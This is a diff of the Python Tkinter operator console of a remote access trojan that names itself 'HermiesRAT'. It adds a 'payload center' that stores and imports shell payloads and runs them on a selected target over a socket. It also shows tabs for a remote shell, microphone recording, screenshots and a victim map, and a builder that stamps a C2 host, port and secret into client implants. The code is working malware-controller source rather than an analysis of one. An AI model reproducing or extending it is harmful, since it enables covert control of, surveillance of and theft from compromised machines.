+        lib_hdr = tk.Frame(left, bg=T["BG2"], height=28)
+        lib_hdr.pack(fill=tk.X); lib_hdr.pack_propagate(False)
+        tk.Label(lib_hdr, text="LIBRARY", bg=T["BG2"], fg=T["ACCENT"],
+                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=5)
+        tk.Button(lib_hdr, text="⟳", bg=T["BG2"], fg=T["FG_DIM"],
+                  font=FONT, relief="flat", cursor="hand2",
+                  command=self._pc_refresh_list).pack(side=tk.RIGHT, padx=6, pady=4)
+
+        # search / filter
+        sf = tk.Frame(left, bg=T["BG3"], height=26)
+        sf.pack(fill=tk.X, padx=6, pady=(0, 2)); sf.pack_propagate(False)
+        tk.Label(sf, text="🔍", bg=T["BG3"], fg=T["FG_DIM"],
+                 font=("Segoe UI", 9)).pack(side=tk.LEFT, padx=(4, 0))
+        self._pc_filter_var = tk.StringVar()
+        self._pc_filter_var.trace_add("write", lambda *_: self._pc_refresh_list())
+        tk.Entry(sf, textvariable=self._pc_filter_var,
+                 bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
+                 font=FONT_SML, relief="flat",
+                 highlightthickness=0).pack(side=tk.LEFT, fill=tk.X, expand=True, pady=2, padx=4)
+
+        # listbox
+        lsf = tk.Frame(left, bg=T["BG2"])
+        lsf.pack(fill=tk.BOTH, expand=True, padx=6, pady=(0, 4))
+        lb_sb = ttk.Scrollbar(lsf, orient=tk.VERTICAL)
+        self._pc_lb = tk.Listbox(
+            lsf, bg=T["BG3"], fg=T["FG"], font=FONT_SML,
+            selectbackground=T["ACCENT"], selectforeground=T["HDR_FG"],
+            relief="flat", borderwidth=0, highlightthickness=0, activestyle="none",
+            yscrollcommand=lb_sb.set)
+        lb_sb.config(command=self._pc_lb.yview)
+        self._pc_lb.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        lb_sb.pack(side=tk.LEFT, fill=tk.Y)
+        self._pc_lb.bind("<<ListboxSelect>>", self._pc_lb_select)
+        self._pc_lb.bind("<Double-Button-1>", lambda e: self._pc_load_to_editor())
+
+        # delete buttons row
+        del_row = tk.Frame(left, bg=T["BG2"])
+        del_row.pack(fill=tk.X, padx=6, pady=(0, 6))
+        tk.Button(del_row, text="🗑 delete selected", bg=T["BG3"], fg=T["RED"],
+                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
+                  command=self._pc_delete_selected).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
+        tk.Button(del_row, text="🗑 delete all", bg=T["BG3"], fg=T["RED"],
+                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
+                  command=self._pc_delete_all).pack(side=tk.LEFT, fill=tk.X, expand=True)
+
+        #  MIDDLE: editor 
+        mid = tk.Frame(pane, bg=T["BG2"])
+        pane.add(mid, minsize=360, width=600)
+
+        # save-to-library bar
+        save_bar = tk.Frame(mid, bg=T["BG2"], height=36)
+        save_bar.pack(fill=tk.X); save_bar.pack_propagate(False)
+        tk.Label(save_bar, text="Name:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(side=tk.LEFT, padx=(10, 2), pady=8)
+        self._pc_name_var = tk.StringVar()
+        tk.Entry(save_bar, textvariable=self._pc_name_var,
+                 bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
+                 font=FONT_SML, relief="flat", width=18,
+                 highlightbackground=T["BG4"], highlightthickness=1
+                 ).pack(side=tk.LEFT, pady=6, padx=(0, 6))
+        tk.Label(save_bar, text="Tags:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(side=tk.LEFT, padx=(0, 2))
+        self._pc_tags_var = tk.StringVar()
+        tk.Entry(save_bar, textvariable=self._pc_tags_var,
+                 bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
+                 font=FONT_SML, relief="flat", width=14,
+                 highlightbackground=T["BG4"], highlightthickness=1
+                 ).pack(side=tk.LEFT, pady=6, padx=(0, 6))
+        tk.Button(save_bar, text="💾 save to library",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=8, cursor="hand2",
+                  command=self._pc_save_to_library).pack(side=tk.LEFT, pady=6)
+
+        tk.Frame(mid, bg=T["BG4"], height=1).pack(fill=tk.X, padx=8, pady=0)
+
+        # shell selector row
+        sh_row = tk.Frame(mid, bg=T["BG2"], height=32)
+        sh_row.pack(fill=tk.X); sh_row.pack_propagate(False)
+        tk.Label(sh_row, text="Shell:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(side=tk.LEFT, padx=(10, 6), pady=6)
+        self._pc_shell_var = tk.StringVar(value="powershell")
+        for v, lbl_t in (("powershell", "PowerShell"), ("bash", "Bash"), ("cmd", "CMD")):
+            tk.Radiobutton(sh_row, text=lbl_t, variable=self._pc_shell_var, value=v,
+                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
+                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
+                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
+                           padx=10, pady=3, relief="flat", cursor="hand2"
+                           ).pack(side=tk.LEFT, padx=2)
+
+        tk.Frame(mid, bg=T["BG4"], height=1).pack(fill=tk.X, padx=8, pady=0)
+
+        # editor label
+        tk.Label(mid, text="Payload editor", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(anchor="w", padx=10, pady=(6, 2))
+
+        # text editor
+        self._pc_editor = tk.Text(
+            mid, bg=T["BG3"], fg=T["FG"], font=FONT_MON,
+            insertbackground=T["ACCENT"], selectbackground=T["BG4"],
+            selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
+            highlightbackground=T["BG4"], highlightthickness=1,
+            wrap=tk.NONE, undo=True)
+        self._pc_editor.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0, 6))
+
+        # import-from-file row
+        imp_row = tk.Frame(mid, bg=T["BG2"], height=36)
+        imp_row.pack(fill=tk.X); imp_row.pack_propagate(False)
+        tk.Button(imp_row, text="📂 import from file…",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=8, cursor="hand2",
+                  command=self._pc_import_file).pack(side=tk.LEFT, padx=10, pady=6)
+        tk.Button(imp_row, text="📁 import folder…",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=8, cursor="hand2",
+                  command=self._pc_import_folder).pack(side=tk.LEFT, padx=(0, 6), pady=6)
+        tk.Button(imp_row, text="✂ clear editor",
+                  bg=T["BG3"], fg=T["FG_DIM"], font=("Segoe UI", 8), relief="flat",
+                  padx=6, cursor="hand2",
+                  command=lambda: self._pc_editor.delete("1.0", tk.END)
+                  ).pack(side=tk.LEFT, pady=6)
+
+        #  RIGHT: actions 
+        right = tk.Frame(pane, bg=T["BG"],
+                         highlightbackground=T["ACCENT"], highlightthickness=1)
+        pane.add(right, minsize=180, width=200)
+
+        tk.Label(right, text="ACTIONS", bg=T["BG"], fg=T["ACCENT"],
+                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=12, pady=(14, 4))
+        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=4)
+
+        tk.Button(right, text="  type command",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=10, pady=6, cursor="hand2", anchor="w",
+                  command=self._pc_type_command).pack(fill=tk.X, padx=12, pady=(0, 4))
+
+        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=(0, 4))
+
+        tk.Button(right, text="  load to Task",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=10, pady=6, cursor="hand2", anchor="w",
+                  command=self._pc_send_to_task).pack(fill=tk.X, padx=12, pady=4)
+
+        tk.Button(right, text="  run on target",
+                  bg=T["ACCENT"], fg=T["HDR_FG"],
+                  font=("Segoe UI", 10, "bold"), relief="flat",
+                  padx=10, pady=6, cursor="hand2", anchor="w",
+                  command=self._pc_run_now).pack(fill=tk.X, padx=12, pady=(0, 4))
+
+        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=8)
+
+        # forward-to-tasks bulk section
+        tk.Label(right, text="Forward library\npayload to task:",
+                 bg=T["BG"], fg=T["FG_DIM"], font=("Segoe UI", 8),
+                 justify="left").pack(anchor="w", padx=12)
+        tk.Button(right, text="  send selected\n     Task tab",
+                  bg=T["BG3"], fg=T["FG"], font=("Segoe UI", 8), relief="flat",
+                  padx=8, pady=6, cursor="hand2", justify="left",
+                  command=self._pc_send_to_task).pack(fill=tk.X, padx=12, pady=(4, 2))
+
+        tk.Frame(right, bg=T["BG4"], height=1).pack(fill=tk.X, padx=12, pady=10)
+
+        self._pc_status = tk.Label(right, text="", bg=T["BG"], fg=T["FG_DIM"],
+                                   font=("Segoe UI", 8), wraplength=170, justify="left")
+        self._pc_status.pack(anchor="w", padx=12)
+
+        # output panel
+        out_hdr = tk.Frame(right, bg=T["BG2"], height=24)
+        out_hdr.pack(fill=tk.X, side=tk.BOTTOM)
+        out_hdr.pack_propagate(False)
+        tk.Label(out_hdr, text="Output", bg=T["BG2"], fg=T["ACCENT"],
+                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=8, pady=3)
+        tk.Button(out_hdr, text="clear", bg=T["BG2"], fg=T["FG_DIM"],
+                  font=("Segoe UI", 7), relief="flat", cursor="hand2",
+                  command=lambda: self._clear_text(self._pc_out)
+                  ).pack(side=tk.RIGHT, padx=4, pady=2)
+        self._pc_out = scrolledtext.ScrolledText(
+            right, bg=T["BG"], fg=T["FG"], font=FONT_MON,
+            state="disabled", wrap=tk.WORD, relief="flat", borderwidth=0,
+            height=10, insertbackground=T["ACCENT"])
+        self._pc_out.pack(fill=tk.BOTH, expand=True, side=tk.BOTTOM)
+
+    #  payload center helpers 
+
+    def _pc_refresh_target(self):
+        T = THEME
+        if self.selected_cid is None:
+            self._pc_target_lbl.configure(text="none selected", fg=T["RED"])
+        else:
+            info  = clients.get(self.selected_cid, {})
+            label = info.get("label", f"id={self.selected_cid}")
+            user_ = info.get("user", "")
+            tag   = f"id={self.selected_cid}  {label}"
+            if user_: tag += f"  user={user_}"
+            self._pc_target_lbl.configure(text=tag, fg=T["GREEN"])
+
+    def _pc_refresh_list(self):
+        q = self._pc_filter_var.get().lower().strip()
+        self._pc_lb.delete(0, tk.END)
+        self._pc_filtered_indices = []
+        for i, p in enumerate(_payload_library):
+            haystack = f"{p.get('name','')} {p.get('shell','')} {p.get('tags','')}".lower()
+            if q and q not in haystack:
+                continue
+            badge = f"[{p.get('shell','?')}]"
+            tags  = p.get("tags", "").strip()
+            line  = f"{badge}  {p.get('name', 'unnamed')}"
+            if tags: line += f"  · {tags}"
+            self._pc_lb.insert(tk.END, line)
+            self._pc_filtered_indices.append(i)
+
+    def _pc_lb_select(self, event=None):
+        sel = self._pc_lb.curselection()
+        if not sel: return
+        idx = self._pc_filtered_indices[sel[0]]
+        p   = _payload_library[idx]
+        # populate metadata fields
+        self._pc_name_var.set(p.get("name", ""))
+        self._pc_tags_var.set(p.get("tags", ""))
+        self._pc_shell_var.set(p.get("shell", "powershell"))
+        # populate editor
+        self._pc_editor.delete("1.0", tk.END)
+        self._pc_editor.insert("1.0", p.get("code", ""))
+
+    def _pc_load_to_editor(self):
+        # double-click = same as single-select (already wired)
+        self._pc_lb_select()
+
+    def _pc_save_to_library(self):
+        name = self._pc_name_var.get().strip()
+        if not name:
+            self._pc_status.configure(text="give the payload a name first", fg=THEME["RED"])
+            return
+        code = self._pc_editor.get("1.0", tk.END).strip()
+        if not code:
+            self._pc_status.configure(text="editor is empty", fg=THEME["RED"])
+            return
+        entry = {
+            "name":  name,
+            "shell": self._pc_shell_var.get(),
+            "tags":  self._pc_tags_var.get().strip(),
+            "code":  code,
+        }
+        # update existing or append
+        for i, p in enumerate(_payload_library):
+            if p.get("name", "") == name:
+                _payload_library[i] = entry
+                _pc_save()
+                self._pc_refresh_list()
+                self._pc_status.configure(text=f"updated: {name}", fg=THEME["GREEN"])
+                return
+        _payload_library.append(entry)
+        _pc_save()
+        self._pc_refresh_list()
+        self._pc_status.configure(text=f"saved: {name}", fg=THEME["GREEN"])
+        self.log(f"[payload center] saved '{name}'")
+
+    def _pc_delete_selected(self):
+        sel = self._pc_lb.curselection()
+        if not sel: return
+        idx = self._pc_filtered_indices[sel[0]]
+        name = _payload_library[idx].get("name", "?")
+        if not messagebox.askyesno("delete payload", f"Remove '{name}' from library?"):
+            return
+        del _payload_library[idx]
+        _pc_save()
+        self._pc_refresh_list()
+        self._pc_editor.delete("1.0", tk.END)
+        self._pc_name_var.set("")
+        self._pc_tags_var.set("")
+        self._pc_status.configure(text=f"deleted: {name}", fg=THEME["FG_DIM"])
+        self.log(f"[payload center] deleted '{name}'")
+
+    def _pc_delete_all(self):
+        if not _payload_library:
+            self._pc_status.configure(text="library is already empty", fg=THEME["FG_DIM"])
+            return
+        count = len(_payload_library)
+        if not messagebox.askyesno(
+                "delete all payloads",
+                f"Remove ALL {count} payload(s) from the library?\nThis cannot be undone."):
+            return
+        _payload_library.clear()
+        _pc_save()
+        self._pc_refresh_list()
+        self._pc_editor.delete("1.0", tk.END)
+        self._pc_name_var.set("")
+        self._pc_tags_var.set("")
+        self._pc_status.configure(text=f"library cleared ({count} removed)", fg=THEME["FG_DIM"])
+        self.log(f"[payload center] deleted all {count} payload(s)")
+
+    def _pc_type_command(self):
+        T = THEME
+        dlg = tk.Toplevel(self)
+        dlg.title("Type Command")
+        dlg.configure(bg=T["BG2"])
+        dlg.resizable(True, True)
+        dlg.geometry("560x320")
+        dlg.grab_set()
+
+        # header
+        hdr = tk.Frame(dlg, bg=T["BG2"], height=30)
+        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
+        tk.Label(hdr, text="Type your command:", bg=T["BG2"], fg=T["ACCENT"],
+                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=12, pady=6)
+
+        # shell selector
+        sh_row = tk.Frame(dlg, bg=T["BG2"], height=28)
+        sh_row.pack(fill=tk.X); sh_row.pack_propagate(False)
+        tk.Label(sh_row, text="Shell:", bg=T["BG2"], fg=T["FG_DIM"],
+                 font=FONT).pack(side=tk.LEFT, padx=(12, 6), pady=4)
+        dlg_shell_var = tk.StringVar(value=self._pc_shell_var.get())
+        for v, lbl_t in (("powershell", "PowerShell"), ("bash", "Bash"), ("cmd", "CMD")):
+            tk.Radiobutton(sh_row, text=lbl_t, variable=dlg_shell_var, value=v,
+                           bg=T["BG2"], fg=T["FG"], selectcolor=T["BG3"],
+                           activebackground=T["BG2"], activeforeground=T["ACCENT"],
+                           font=FONT, bd=0, highlightthickness=0, indicatoron=0,
+                           padx=8, pady=2, relief="flat", cursor="hand2"
+                           ).pack(side=tk.LEFT, padx=2)
+
+        tk.Frame(dlg, bg=T["BG4"], height=1).pack(fill=tk.X, padx=10, pady=(2, 0))
+
+        # text input area
+        txt = tk.Text(dlg, bg=T["BG3"], fg=T["FG"], font=FONT_MON,
+                      insertbackground=T["ACCENT"], selectbackground=T["BG4"],
+                      selectforeground=T["ACCENT"], relief="flat", borderwidth=0,
+                      highlightbackground=T["BG4"], highlightthickness=1,
+                      wrap=tk.NONE, undo=True)
+        txt.pack(fill=tk.BOTH, expand=True, padx=10, pady=8)
+        txt.focus_set()
+
+        # button row
+        btn_row = tk.Frame(dlg, bg=T["BG2"], height=42)
+        btn_row.pack(fill=tk.X); btn_row.pack_propagate(False)
+
+        def _load_to_editor():
+            cmd = txt.get("1.0", tk.END).strip()
+            if not cmd:
+                return
+            self._pc_shell_var.set(dlg_shell_var.get())
+            self._pc_editor.delete("1.0", tk.END)
+            self._pc_editor.insert("1.0", cmd)
+            self._pc_status.configure(text="command loaded to editor", fg=THEME["ACCENT"])
+            dlg.destroy()
+
+        def _run_now():
+            cmd = txt.get("1.0", tk.END).strip()
+            if not cmd:
+                return
+            self._pc_shell_var.set(dlg_shell_var.get())
+            self._pc_editor.delete("1.0", tk.END)
+            self._pc_editor.insert("1.0", cmd)
+            dlg.destroy()
+            self._pc_run_now()
+
+        def _on_ctrl_enter(event):
+            _run_now()
+
+        txt.bind("<Control-Return>", _on_ctrl_enter)
+
+        tk.Button(btn_row, text="load to editor",
+                  bg=T["BG3"], fg=T["FG"], font=FONT, relief="flat",
+                  padx=12, pady=6, cursor="hand2",
+                  command=_load_to_editor).pack(side=tk.LEFT, padx=(12, 4), pady=6)
+        tk.Button(btn_row, text="run on target  (Ctrl+Enter)",
+                  bg=T["ACCENT"], fg=T["HDR_FG"],
+                  font=("Segoe UI", 10, "bold"), relief="flat",
+                  padx=12, pady=6, cursor="hand2",
+                  command=_run_now).pack(side=tk.LEFT, padx=(0, 4), pady=6)
+        tk.Button(btn_row, text="cancel",
+                  bg=T["BG3"], fg=T["FG_DIM"], font=("Segoe UI", 8), relief="flat",
+                  padx=8, cursor="hand2",
+                  command=dlg.destroy).pack(side=tk.RIGHT, padx=12, pady=6)
+
+    def _pc_import_file(self):
+        path = filedialog.askopenfilename(
+            title="Import payload from file",
+            filetypes=[
+                ("Scripts / payloads", "*.ps1 *.sh *.bat *.cmd *.txt *.py *.rb *.lua"),
+                ("All files", "*.*"),
+            ])
+        if not path: return
+        try:
+            with open(path, "r", encoding="utf-8", errors="replace") as fh:
+                src = fh.read()
+        except Exception as e:
+            self._pc_status.configure(text=f"read error: {e}", fg=THEME["RED"])
+            return
+        self._pc_editor.delete("1.0", tk.END)
+        self._pc_editor.insert("1.0", src)
+        # auto-detect shell from extension
+        ext = os.path.splitext(path)[1].lower()
+        shell_map = {".ps1": "powershell", ".sh": "bash", ".bat": "cmd", ".cmd": "cmd"}
+        if ext in shell_map:
+            self._pc_shell_var.set(shell_map[ext])
+        # auto-fill name from filename
+        base = os.path.splitext(os.path.basename(path))[0]
+        if not self._pc_name_var.get().strip():
+            self._pc_name_var.set(base)
+        self._pc_status.configure(
+            text=f"imported: {os.path.basename(path)}\n{len(src)} chars", fg=THEME["GREEN"])
+        self.log(f"[payload center] imported {path}")
+
+    def _pc_import_folder(self):
+        folder = filedialog.askdirectory(title="Import all payloads from folder")
+        if not folder:
+            return
+        _EXT_SHELL_PC = {
+            ".ps1": "powershell", ".sh": "bash", ".bat": "cmd", ".cmd": "cmd",
+            ".txt": "powershell", ".py": "bash", ".rb": "bash", ".lua": "bash",
+        }
+        imported = 0
+        skipped  = 0
+        for root, _dirs, files in os.walk(folder):
+            for fname in sorted(files):
+                ext = os.path.splitext(fname)[1].lower()
+                if ext not in _EXT_SHELL_PC:
+                    skipped += 1
+                    continue
+                fpath = os.path.join(root, fname)
+                try:
+                    with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
+                        src = fh.read().strip()
+                except Exception as e:
+                    self.log(f"[payload center] folder import skip {fname}: {e}")
+                    skipped += 1
+                    continue
+                if not src:
+                    skipped += 1
+                    continue
+                name  = os.path.splitext(fname)[0]
+                shell = _EXT_SHELL_PC[ext]
+                entry = {"name": name, "shell": shell, "tags": "", "code": src}
+                # update existing or append
+                found = False
+                for i, p in enumerate(_payload_library):
+                    if p.get("name", "") == name:
+                        _payload_library[i] = entry
+                        found = True
+                        break
+                if not found:
+                    _payload_library.append(entry)
+                imported += 1
+        if imported:
+            _pc_save()
+            self._pc_refresh_list()
+            self._pc_status.configure(
+                text=f"folder import done: {imported} loaded, {skipped} skipped",
+                fg=THEME["GREEN"])
+            self.log(f"[payload center] folder import: {imported} payloads from {folder}")
+        else:
+            self._pc_status.configure(
+                text=f"no payloads found in folder ({skipped} skipped)",
+                fg=THEME["FG_DIM"])
+
+    def _pc_send_to_task(self):
+        code  = self._pc_editor.get("1.0", tk.END).strip()
+        shell = self._pc_shell_var.get()
+        if not code:
+            self._pc_status.configure(text="editor is empty", fg=THEME["RED"])
+            return
+        self._task_load_payload(shell, code)
+        self._switch_tab("Task")
+        self.log(f"[payload center] forwarded to Task [{shell}]")
+
+    def _pc_run_now(self):
+        if self.selected_cid is None:
+            self._pc_refresh_target()
+            self._pc_status.configure(text="no target selected", fg=THEME["RED"])
+            return
+        code  = self._pc_editor.get("1.0", tk.END).strip()
+        shell = self._pc_shell_var.get()
+        if not code:
+            self._pc_status.configure(text="editor is empty", fg=THEME["RED"])
+            return
+        name = self._pc_name_var.get().strip() or "payload"
+        ts   = time.strftime("%H:%M:%S")
+        self._append(self._pc_out,
+                     f"\n[{ts}] >> [{shell}] running '{name}'...\n{code[:200]}\n")
+        threading.Thread(target=self._pc_run_worker,
+                         args=(clients[self.selected_cid]["sock"], shell, code, name),
+                         daemon=True).start()
+
+    def _pc_run_worker(self, sock, shell, code, name):
+        tx_b = rx_b = 0
+        try:
+            payload = json.dumps({"cmd": "shell", "data": {"shell": shell, "cmd": code}}).encode()
+            tx_b    = len(payload) + 4
+            send_msg(sock, "shell", {"shell": shell, "cmd": code})
+            resp = recv_msg(sock)
+            if resp: rx_b = len(json.dumps(resp).encode()) + 4
+            out  = resp["data"] if resp else "<no response>"
+        except Exception as e:
+            out = f"<error: {e}>"
+        self._append(self._pc_out,
+                     f"[{time.strftime('%H:%M:%S')}] << done\n{out}\n{'=' * 60}\n")
+        self.log(f"[payload center] '{name}' [{shell}] done")
+        if self.selected_cid is not None:
+            self._dl_record(self.selected_cid, tx_b, rx_b, f"pc/{shell}: {name[:60]}")
+        self.after(0, lambda: self._pc_status.configure(
+            text=f"done: {name}", fg=THEME["GREEN"]))
+
+    #  files tab
 
     def _build_files_tab(self):
         T = THEME
@@ -2456,7 +3467,7 @@ class HermiesGUI(tk.Tk):
         self.update()
         self._fb_status.configure(text=f"copied:\n{fp}")
 
-    #  scripts tab 
+    #  scripts tab
 
     def _build_scripts_tab(self):
         T = THEME
@@ -2549,17 +3560,17 @@ class HermiesGUI(tk.Tk):
             insertbackground=T["ACCENT"])
         self._scr_out.pack(fill=tk.BOTH, expand=True)
 
-        #  [PLACEHOLDER: custom_script_slot_1] ─
+        #  [PLACEHOLDER: custom_script_slot_1] 
         # TODO: bind additional script categories or dynamic folder watchers here.
         # Pattern: add a new entry to self._scripts_data[<folder_name>] = [<script_dicts>]
         # Each script dict: {"name": str, "path": str, "shell": str, "size": int}
-        #  [PLACEHOLDER: custom_script_slot_2] ─
+        #  [PLACEHOLDER: custom_script_slot_2] 
         # TODO: inject extra toolbar buttons into the scripts tab (e.g. upload script,
         # delete script, rename folder). Wire them to self._scr_folder_lb or _scr_file_lb.
-        #  [PLACEHOLDER: custom_script_slot_3] ─
+        #  [PLACEHOLDER: custom_script_slot_3] 
         # TODO: add per-script argument injection UI. Provide a small Entry widget
         # between preview and RUN, then prepend/append args to cmd in _scr_run().
-        # ─
+        # 
         self._scr_refresh()
 
     def _scr_refresh(self):
@@ -2639,7 +3650,7 @@ class HermiesGUI(tk.Tk):
         ts = time.strftime("%H:%M:%S")
         self._append(self._scr_out,
                      f"\n[{ts}] running  {name}  via {shell}"
-                     f"  on id={self.selected_cid}\n{'─' * 60}\n")
+                     f"  on id={self.selected_cid}\n{'' * 60}\n")
         threading.Thread(target=self._scr_worker,
                          args=(clients[self.selected_cid]["sock"], shell, cmd, name),
                          daemon=True).start()
@@ -2667,7 +3678,7 @@ class HermiesGUI(tk.Tk):
                                 self._scr_preview.get("1.0", tk.END).strip())
         self._switch_tab("Task")
 
-    #  builder tab 
+    #  builder tab
 
     def _build_builder_tab(self):
         T = THEME
@@ -2743,7 +3754,7 @@ class HermiesGUI(tk.Tk):
         msb.pack(side=tk.LEFT, fill=tk.Y)
         self._b_refresh_modules()
 
-    #  shell tab 
+    #  shell tab
 
     def _build_shell_tab(self):
         T = THEME
@@ -2792,7 +3803,7 @@ class HermiesGUI(tk.Tk):
         tk.Button(bar, text="send", bg=T["BG3"], fg=T["FG"], font=FONT,
                   relief="flat", command=self._shell_send).pack(side=tk.LEFT, padx=6)
 
-    #  mic tab 
+    #  mic tab
 
     def _build_mic_tab(self):
         T = THEME
@@ -2947,7 +3958,7 @@ class HermiesGUI(tk.Tk):
             out  = resp["data"] if resp else "<no response>"
         except Exception as e:
             out = f"<error: {e}>"
-        self._append(self._mic_out, f"{out}\n{'─'*60}\n")
+        self._append(self._mic_out, f"{out}\n{''*60}\n")
 
     def _mic_record(self):
         if self.selected_cid is None:
@@ -3082,7 +4093,7 @@ class HermiesGUI(tk.Tk):
         except Exception as e:
             self.log(f"[mic] save error: {e}")
 
-    #  map tab 
+    #  map tab
 
     def _build_map_tab(self):
         T = THEME
@@ -3118,7 +4129,7 @@ class HermiesGUI(tk.Tk):
                               sashwidth=4, sashrelief="flat")
         pane.pack(fill=tk.BOTH, expand=True)
 
-        #  map canvas (tkintermapview if available, else coord canvas) 
+        #  map canvas (tkintermapview if available, else coord canvas)
         map_host = tk.Frame(pane, bg=T["BG"])
         pane.add(map_host, minsize=400, width=720)
 
@@ -3143,7 +4154,7 @@ class HermiesGUI(tk.Tk):
             self._map_dots = {}
             self._map_canvas.bind("<Configure>", lambda e: self._map_redraw_canvas())
 
-        #  sidebar 
+        #  sidebar
         right = tk.Frame(pane, bg=T["BG2"],
                          highlightbackground=T["ACCENT"], highlightthickness=1)
         pane.add(right, minsize=280)
@@ -3344,7 +4355,7 @@ class HermiesGUI(tk.Tk):
             self._map_redraw_canvas()
         self._map_status.configure(text="cleared", fg=THEME["FG_DIM"])
 
-    #  settings tab ─
+    #  settings tab 
 
     def _build_settings_tab(self):
         T = THEME
@@ -3594,7 +4605,7 @@ class HermiesGUI(tk.Tk):
         self._settings_refresh_db()
         self.log(f"[db] note saved for {ip}")
 
-    #  customize tab 
+    #  customize tab
 
     def _build_custom_tab(self):
         T = THEME
@@ -3759,7 +4770,7 @@ class HermiesGUI(tk.Tk):
         self.log("[theme] applying custom theme rebuilding UI")
         self.after(50, self._full_theme_rebuild)
 
-    #  shared helpers ─
+    #  shared helpers 
 
     def _shell_send(self):
         cmd = self.shell_entry.get().strip()
@@ -3778,7 +4789,7 @@ class HermiesGUI(tk.Tk):
         except Exception as e:
             out = f"<error: {e}>"
         self._append(self._shell_out_right,
-                     f"[{shell_type}] {cmd}\n{out}\n{'─' * 60}\n")
+                     f"[{shell_type}] {cmd}\n{out}\n{'' * 60}\n")
 
     def _screenshot(self):
         if self.selected_cid is None: return self.log("no target selected")
@@ -4008,6 +5019,9 @@ class HermiesGUI(tk.Tk):
         self._b_status.configure(text="new secret generated build to apply",
                                  fg=THEME["ACCENT2"])
 
+    # lang: Python 3, file: HermiesRAT-Bata-1.py, target: Linux builder
+# fix: replace .format() with str.replace() — sidesteps all brace conflicts in template
+
     def _b_build(self):
         T = THEME
         host   = self._b_host.get().strip()
@@ -4015,19 +5029,29 @@ class HermiesGUI(tk.Tk):
         secret = self._b_secret.get().strip()
         retry  = self._b_retry.get().strip()
         out    = self._b_out.get().strip()
+
         try: port_int = int(port); assert 1 <= port_int <= 65535
         except Exception:
             return self._b_status.configure(text="invalid port", fg=T["RED"])
+
         try: secret_bytes = secret.encode(); base64.b64decode(secret_bytes)
         except Exception:
             return self._b_status.configure(text="secret must be valid base64", fg=T["RED"])
+
         try: retry_int = int(retry); assert retry_int >= 1
         except Exception: retry_int = 5
+
         selected    = [n for n, v in self._b_mod_vars.items() if v.get()]
         module_code = _build_module_injection(selected)
-        src = CLIENT_TEMPLATE.format(c2_host=host, c2_port=port_int,
-                                     secret=secret_bytes, retry=retry_int)
+
+        src = CLIENT_TEMPLATE
+        src = src.replace("{c2_host!r}",  repr(host))
+        src = src.replace("{c2_port}",    str(port_int))
+        src = src.replace("{secret!r}",   repr(secret_bytes))
+        src = src.replace("{retry}",      str(retry_int))
         src = src.replace("__MODULE_INJECT__", module_code)
+        src = src.replace("{{", "{").replace("}}", "}")  # collapse escaped braces
+
         mod_summary = (f"  [{len(selected)} module(s): {', '.join(selected)}]"
                        if selected else "")
         try:
@@ -4104,9 +5128,10 @@ class HermiesGUI(tk.Tk):
         widget.configure(state="disabled")
 
 
-#  [ENTRYPOINT] 
+#  [ENTRYPOINT]
 if __name__ == "__main__":
     _load_config()
+    _pc_load()
     app = HermiesGUI()
     if _config.get("db_path"):
         _db_init(_config["db_path"])
